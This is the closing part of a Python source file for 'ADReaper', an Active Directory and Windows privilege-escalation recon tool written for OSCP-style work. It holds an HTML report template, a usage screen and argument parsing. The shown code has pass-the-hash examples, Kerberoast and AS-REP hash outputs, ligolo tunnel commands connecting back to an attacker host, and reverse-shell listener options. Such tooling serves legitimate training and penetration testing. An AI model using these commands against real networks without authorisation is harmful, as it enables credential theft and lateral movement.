  .center {{ text-align: center; }}
  td.center {{ color: var(--green); font-weight: 700; }}
  .desc {{ color: var(--text-dim); max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
  .row-critical td {{ border-left: 3px solid var(--red); }}
  .row-high td {{ border-left: 3px solid var(--orange); }}
  .row-medium td {{ border-left: 3px solid var(--yellow); }}

  /* PRIVESC */
  .privesc-card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 10px;
                   margin-bottom: 10px; overflow: hidden; }}
  .privesc-header {{ padding: 12px 16px; background: var(--surface2); display: flex;
                     align-items: center; gap: 12px; cursor: pointer; }}
  .privesc-body {{ padding: 16px; display: none; }}
  .privesc-body.open {{ display: block; }}

  /* NXC */
  .nxc-section {{ margin-bottom: 16px; }}
  .nxc-label {{ color: var(--yellow); font-weight: 600; font-size: 13px; margin-bottom: 6px; }}
  .nxc-section pre {{ color: #8b949e; }}

  /* DOMAIN SUMMARY */
  .domain-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }}
  .domain-item {{ background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }}
  .domain-item .dk {{ color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }}
  .domain-item .dv {{ color: var(--text); font-weight: 600; font-size: 15px; margin-top: 4px; }}

  .footer {{ text-align: center; color: var(--text-dim); font-size: 12px; padding: 24px;
             border-top: 1px solid var(--border); }}
  .tag {{ background: var(--surface2); border: 1px solid var(--border); border-radius: 4px;
          padding: 2px 7px; font-size: 11px; color: var(--text-dim); margin-left: 8px; }}
</style>
</head>
<body>

<nav class="nav">
  <span class="nav-brand">🐉 ADReaper</span>
  <div class="nav-links">
    <a href="#overview">Overview</a>
    <a href="#findings">Findings</a>
    <a href="#users">Users</a>
    <a href="#computers">Computers</a>
    <a href="#privesc">PrivEsc</a>
    <a href="#nxc">NXC Output</a>
  </div>
</nav>

<div class="hero">
  {DRAGON_SVG}
  <div class="hero-sub" style="margin-top:4px">Active Directory &amp; Windows PrivEsc Recon · OSCP-compliant · enumeration only</div>
  <div class="hero-meta">
    <div class="hero-meta-item"><div class="label">Target DC</div><div class="value">{html_escape(args.dc_ip)}</div></div>
    <div class="hero-meta-item"><div class="label">Domain</div><div class="value">{html_escape(args.domain)}</div></div>
    <div class="hero-meta-item"><div class="label">User</div><div class="value">{html_escape(args.user or 'anonymous')}</div></div>
    <div class="hero-meta-item"><div class="label">Date</div><div class="value">{meta_time}</div></div>
  </div>
</div>

<!-- STATS -->
<div class="stats-section" id="overview">
  <div class="stats-grid">
    {stat_card("CRITICAL", crit, "#e74c3c")}
    {stat_card("HIGH", high, "#e67e22")}
    {stat_card("MEDIUM", med, "#f1c40f")}
    {stat_card("Users", len(results['users']), "#3498db")}
    {stat_card("Computers", len(results['computers']), "#3498db")}
    {stat_card("Kerberoastable", len(results['spn_users']), "#9b59b6")}
    {stat_card("ASREPRoastable", len(results['asrep_users']), "#9b59b6")}
    {stat_card("Stale Hosts", len(results['stale_computers']), "#e67e22")}
  </div>
</div>

<!-- DOMAIN SUMMARY -->
<div class="section">
  <div class="section-title">Domain Summary</div>
  <div class="domain-grid">
    <div class="domain-item"><div class="dk">Domain</div><div class="dv">{html_escape(str(d.get('name','?')))}</div></div>
    <div class="domain-item"><div class="dk">Min Password Length</div><div class="dv">{html_escape(str(d.get('min_pwd_length','?')))}</div></div>
    <div class="domain-item"><div class="dk">Lockout Threshold</div><div class="dv">{html_escape(str(d.get('lockout_threshold','?')))}</div></div>
    <div class="domain-item"><div class="dk">Pwd History</div><div class="dv">{html_escape(str(d.get('pwd_history','?')))}</div></div>
    <div class="domain-item"><div class="dk">Machine Account Quota</div><div class="dv">{html_escape(str(d.get('machine_account_quota','?')))}</div></div>
    <div class="domain-item"><div class="dk">Domain Controllers</div><div class="dv">{"<br>".join(html_escape(dc['hostname']) for dc in dcs) or "?"}</div></div>
  </div>
</div>

<!-- FINDINGS -->
<div class="section" id="findings">
  <div class="section-title">Findings <span class="tag">{len(findings)} total</span></div>
  <div class="filter-bar">
    <button class="filter-btn active" onclick="filterFindings('ALL', this)">All ({len(findings)})</button>
    <button class="filter-btn" onclick="filterFindings('CRITICAL', this)" style="border-color:#e74c3c">🔴 Critical ({sev_counts.get('CRITICAL',0)})</button>
    <button class="filter-btn" onclick="filterFindings('HIGH', this)" style="border-color:#e67e22">🟠 High ({sev_counts.get('HIGH',0)})</button>
    <button class="filter-btn" onclick="filterFindings('MEDIUM', this)" style="border-color:#f1c40f">🟡 Medium ({sev_counts.get('MEDIUM',0)})</button>
    <button class="filter-btn" onclick="filterFindings('INFO', this)">🔵 Info ({sev_counts.get('INFO',0)})</button>
  </div>
  {finding_cards}
</div>

<!-- USERS -->
<div class="section" id="users">
  <div class="section-title">Users Enumerated <span class="tag">{len(results['users'])}</span></div>
  <div class="table-wrap">
    <table>
      <thead><tr>
        <th>Username</th><th>Kerberoastable</th><th>ASREPRoastable</th>
        <th>AdminCount</th><th>Pwd Never Set</th><th>Description</th>
      </tr></thead>
      <tbody>{user_rows}</tbody>
    </table>
  </div>
</div>

<!-- COMPUTERS -->
<div class="section" id="computers">
  <div class="section-title">Computers Enumerated <span class="tag">{len(results['computers'])}</span></div>
  <div class="table-wrap">
    <table>
      <thead><tr><th>Hostname</th><th>OS</th><th>Stale (&gt;90d)</th><th>Days Since Logon</th></tr></thead>
      <tbody>{comp_rows}</tbody>
    </table>
  </div>
</div>

<!-- PRIVESC -->
<div class="section" id="privesc">
  <div class="section-title">Windows PrivEsc Paths</div>
  <p style="color:var(--text-dim); font-size:13px; margin-bottom:16px;">Run these checks on each compromised Windows host as a low-privilege user.</p>
  {privesc_html}
</div>

<!-- NXC RAW OUTPUT -->
<div class="section" id="nxc">
  <div class="section-title">NXC Live Execution Output</div>
  {nxc_html if nxc_html else '<p style="color:var(--text-dim)">No NXC output captured.</p>'}
</div>

<div class="footer">
  Generated by <strong>ADReaper</strong> · {meta_time} · OSCP-compliant enumeration tool
</div>

<script>
function filterFindings(sev, btn) {{
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.finding-card').forEach(card => {{
    card.style.display = (sev === 'ALL' || card.dataset.sev === sev) ? '' : 'none';
  }});
}}

// Toggle finding bodies
document.querySelectorAll('.finding-header, .privesc-header').forEach(h => {{
  h.addEventListener('click', () => {{
    const body = h.nextElementSibling;
    body.classList.toggle('open');
  }});
}});

// Auto-expand criticals
document.querySelectorAll('.finding-card[data-sev="CRITICAL"] .finding-body').forEach(b => b.classList.add('open'));

// Copy buttons on pre blocks
document.querySelectorAll('pre').forEach(pre => {{
  const btn = document.createElement('button');
  btn.className = 'copy-btn'; btn.textContent = 'Copy';
  btn.onclick = () => {{ navigator.clipboard.writeText(pre.textContent); btn.textContent = 'Copied!'; setTimeout(() => btn.textContent = 'Copy', 1500); }};
  pre.style.position = 'relative';
  pre.prepend(btn);
}});
</script>
</body>
</html>"""

    with open(path, "w") as f:
        f.write(html)
    console.print(f"  [green]HTML report:[/green] {path}")
    return path

# ═════════════════════════════════════════════════════════════════════════════
# ARGS
# ═════════════════════════════════════════════════════════════════════════════

def print_usage():
    """Printed when tool is run with no arguments."""
    # Print the dragon first
    console.print(f"[bold red]{DRAGON}[/bold red]")
    console.print()

    console.print(Panel(
        Text.assemble(
            ("  ADReaper — Active Directory & Windows PrivEsc Recon\n", "bold white"),
            ("  OSCP-compliant · enumeration only · no exploitation\n\n", "dim"),

            ("  ┌─ REQUIRED ──────────────────────────────────────────────┐\n", "dim"),
            ("  -d  / --domain   ", "bold cyan"), ("  Target domain name          ", "white"), ("corp.local\n", "yellow"),
            ("  -dc / --dc-ip    ", "bold cyan"), ("  Domain Controller IP        ", "white"), ("10.10.10.10\n", "yellow"),
            ("  └────────────────────────────────────────────────────────┘\n\n", "dim"),

            ("  ┌─ CREDENTIALS ───────────────────────────────────────────┐\n", "dim"),
            ("  -u  / --user     ", "bold cyan"), ("  Username                    ", "white"), ("john\n", "yellow"),
            ("  -p  / --password ", "bold cyan"), ("  Password                    ", "white"), ("Password123\n", "yellow"),
            ("  --hash           ", "bold cyan"), ("  NTLM hash (pass-the-hash)   ", "white"), (":aad3b435...\n", "yellow"),
            ("  └────────────────────────────────────────────────────────┘\n\n", "dim"),

            ("  ┌─ TARGETING (OSCP pivot scenario) ──────────────────────┐\n", "dim"),
            ("  -t  / --target   ", "bold cyan"), ("  Host to attack (SMB/WinRM)  ", "white"), ("10.10.10.50\n", "yellow"),
            ("                   ", "bold cyan"), ("  └ AD/LDAP always hits -dc   ", "dim"), ("\n", "white"),
            ("                   ", "bold cyan"), ("  └ Host ops run against -t   ", "dim"), ("\n", "white"),
            ("  --lhost          ", "bold cyan"), ("  Your tun0/Kali IP           ", "white"), ("10.50.0.5\n", "yellow"),
            ("  --lport          ", "bold cyan"), ("  Listener port               ", "white"), ("4444\n", "yellow"),
            ("  └────────────────────────────────────────────────────────┘\n\n", "dim"),

            ("  ┌─ OPTIONS ───────────────────────────────────────────────┐\n", "dim"),
            ("  -o  / --output   ", "bold cyan"), ("  Output directory            ", "white"), ("./adreaper_out\n", "yellow"),
            ("  --no-bloodhound  ", "bold cyan"), ("  Skip BloodHound auto-run    ", "white"), ("\n", "white"),
            ("  --no-privesc     ", "bold cyan"), ("  Skip privesc reference      ", "white"), ("\n", "white"),
            ("  --no-ad          ", "bold cyan"), ("  Skip all LDAP/AD modules    ", "white"), ("\n", "white"),
            ("  └────────────────────────────────────────────────────────┘\n\n", "dim"),

            ("  ┌─ MODES ─────────────────────────────────────────────────┐\n", "dim"),
            ("\n  [1] DC MODE — run directly against the Domain Controller\n\n", "bold green"),
            ("      adreaper -d corp.local -dc 10.10.10.10 -u john -p Pass123\n\n", "bold white"),

            ("  [2] HOST MODE — compromised workstation, DC is separate\n\n", "bold green"),
            ("      adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 \\\n", "bold white"),
            ("               -u john -p Pass123\n\n", "bold white"),
            ("      → LDAP/Kerberos/BloodHound/ASREP  hits  10.10.10.10 (DC)\n", "dim"),
            ("      → SMB/WinRM/RDP/shares/sessions   hits  10.10.10.50 (host)\n\n", "dim"),

            ("  [3] PIVOT MODE — ligolo/chisel tunnel, internal network\n\n", "bold green"),
            ("      # Step 1: start ligolo on your Kali\n", "dim"),
            ("      sudo ip tuntap add user kali mode tun ligolo\n", "yellow"),
            ("      sudo ip link set ligolo up\n", "yellow"),
            ("      ./proxy -selfcert\n\n", "yellow"),
            ("      # Step 2: upload + run agent on dual-NIC box\n", "dim"),
            ("      ./agent -connect <KALI_IP>:11601 -ignore-cert\n\n", "yellow"),
            ("      # Step 3: in ligolo console\n", "dim"),
            ("      session → start\n", "yellow"),
            ("      sudo ip route add 10.10.10.0/24 dev ligolo\n\n", "yellow"),
            ("      # Step 4: run adreaper against internal targets\n", "dim"),
            ("      adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.20 \\\n", "bold white"),
            ("               -u john -p Pass123 --lhost 10.50.0.5\n\n", "bold white"),

            ("  [4] PASS-THE-HASH\n\n", "bold green"),
            ("      adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 \\\n", "bold white"),
            ("               -u john --hash :64f12cddaa88057e06a81b54e73b949b\n\n", "bold white"),

            ("  [5] HOST-ONLY SCAN (skip AD, just enumerate the machine)\n\n", "bold green"),
            ("      adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 \\\n", "bold white"),
            ("               -u john -p Pass123 --no-ad --no-bloodhound\n\n", "bold white"),
            ("  └────────────────────────────────────────────────────────┘\n\n", "dim"),

            ("  ┌─ OUTPUT FILES ──────────────────────────────────────────┐\n", "dim"),
            ("  adreaper_report.html  ", "bold green"), ("  Open in browser — full report with filter/copy\n", "white"),
            ("  adreaper_results.json ", "bold green"), ("  Machine-readable full results\n", "white"),
            ("  users.txt             ", "bold green"), ("  Extracted username list\n", "white"),
            ("  asrep_hashes.txt      ", "bold green"), ("  ASREPRoast hashes (if found)\n", "white"),
            ("  kerb_hashes.txt       ", "bold green"), ("  Kerberoast hashes (if found)\n", "white"),
            ("  └────────────────────────────────────────────────────────┘\n", "dim"),
        ),
        title="[bold red]  A D R e a p e r  —  Usage  [/bold red]",
        border_style="red",
        padding=(0, 1),
    ))
    sys.exit(0)


def parse_args():
    # If no arguments at all → show rich usage screen instead of argparse error
    if len(sys.argv) == 1:
        print_usage()

    p = argparse.ArgumentParser(
        description="ADReaper — AD + Windows PrivEsc Recon",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=True,
        epilog="""
MODES:
  [1] DC mode        adreaper -d corp.local -dc 10.10.10.10 -u john -p Pass123
  [2] Host mode      adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 -u john -p Pass123
  [3] Pivot mode     adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.20 -u john -p Pass123 --lhost 10.50.0.5
  [4] Pass-the-hash  adreaper -d corp.local -dc 10.10.10.10 -u john --hash :64f12cddaa88057e06a81b54e73b949b
  [5] Host-only      adreaper -d corp.local -dc 10.10.10.10 -t 10.10.10.50 -u john -p Pass123 --no-ad

KEY CONCEPT:
  -dc  = Domain Controller — LDAP/Kerberos/AD/BloodHound always go here
  -t   = Target host       — SMB/WinRM/RDP/shares/sessions go here
  If -t is not set, it defaults to -dc (DC mode).

Run with no arguments to see the full usage guide.
        """)
    p.add_argument("-d",  "--domain",      required=True,  help="Domain name  e.g. corp.local")
    p.add_argument("-dc", "--dc-ip",       required=True,  help="Domain Controller IP  (LDAP/Kerberos target)")
    p.add_argument("-t",  "--target",      default=None,   help="Target host IP  (SMB/WinRM/RDP target, defaults to --dc-ip)")
    p.add_argument("-u",  "--user",        default=None,   help="Username")
    p.add_argument("-p",  "--password",    default=None,   help="Password")
    p.add_argument("--hash",               default=None,   help="NTLM hash  (:NT  or  LM:NT)")
    p.add_argument("--lhost",              default=None,   help="Your tun0/Kali IP  (for reverse shell commands)")
    p.add_argument("--lport",              default="4444", help="Listener port  (default: 4444)")
    p.add_argument("-o",  "--output",      default="./adreaper_out", help="Output directory  (default: ./adreaper_out)")
    p.add_argument("--no-privesc",         action="store_true", help="Skip Windows PrivEsc reference section")
    p.add_argument("--no-bloodhound",      action="store_true", help="Skip BloodHound auto-collection")
    p.add_argument("--no-ad",              action="store_true", help="Skip all LDAP/AD modules  (host-only scan)")
    return p.parse_args()

# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def run_ldap_modules(args):
    # LDAP always talks to the DC, not the target host
    conn = get_ldap_connection(args)
    if not conn:
        console.print("[red][!] LDAP connection failed — check DC IP and credentials[/red]")
        return
    base_dn = get_base_dn(args.domain)
    console.print(f"\n[green][+] LDAP bound as: {conn.extend.standard.who_am_i() or 'anonymous'}[/green]")
    console.print(f"[green][+] Base DN: {base_dn}[/green]\n")
    section("LDAP ENUMERATION  (target: DC)")
    for name, fn in [
        ("Domain baseline",  lambda: module_domain_info(conn, base_dn, args)),
        ("Users",            lambda: module_users(conn, base_dn, args)),
        ("Computers",        lambda: module_computers(conn, base_dn, args)),
        ("Groups",           lambda: module_groups(conn, base_dn, args)),
        ("Delegation",       lambda: module_delegation(conn, base_dn, args)),
        ("Trusts & GPOs",    lambda: module_trusts(conn, base_dn, args)),
        ("ACLs",             lambda: module_acls(conn, base_dn, args)),
    ]:
        try: fn()
        except Exception as ex:
            console.print(f"[red]  [!] {name}: {ex}[/red]")
    conn.unbind()


def main():
    args = parse_args()

    # Resolve effective target — if not specified, default to DC
    if args.target is None:
        args.target = args.dc_ip

    os.makedirs(args.output, exist_ok=True)

    with results_lock:
        results["meta"] = {
            "domain":      args.domain,
            "dc_ip":       args.dc_ip,
            "target_host": args.target,
            "user":        args.user,
            "started":     datetime.now().isoformat(),
        }

    print_banner(args)

    # Show scan plan
    host_is_dc = args.target == args.dc_ip
    console.print(f"\n  [bold]Scan plan:[/bold]")
    console.print(f"  [cyan]DC (LDAP/Kerberos/AD)[/cyan]  → [white]{args.dc_ip}[/white]")
    console.print(f"  [cyan]Target host (SMB/WinRM)[/cyan] → [white]{args.target}[/white]", end="")
    if host_is_dc:
        console.print("  [dim](same machine)[/dim]")
    else:
        console.print(f"  [yellow]← pivot target[/yellow]")
    if args.lhost:
        console.print(f"  [cyan]Lhost (revshells)[/cyan]     → [white]{args.lhost}[/white]")
    console.print()

    # AD/LDAP modules — always against DC
    if not args.no_ad:
        run_ldap_modules(args)
    else:
        console.print("[yellow]  [!] --no-ad set — skipping all LDAP/AD modules[/yellow]")

    # NXC live execution (DC + host split internally)
    if args.user:
        module_nxc(args)
    else:
        console.print("[yellow]  [!] No credentials — skipping NXC modules[/yellow]")

    # Privesc reference — uses args.target as the host
    if not args.no_privesc:
        module_windows_privesc(args)

    # Console report
    console.print("\n")
    section("ADREAPER REPORT")
    print_domain_summary()
    print_stats()
    print_findings()
    if not args.no_privesc:
        print_privesc()

    # Save HTML
    section("SAVING OUTPUT")
    html_path = save_html(args.output, args)
    console.print(f"\n[bold green][✓] Done! Open report:[/bold green]")
    console.print(f"  [bold cyan]firefox {html_path}[/bold cyan]\n")


if __name__ == "__main__":
    main()
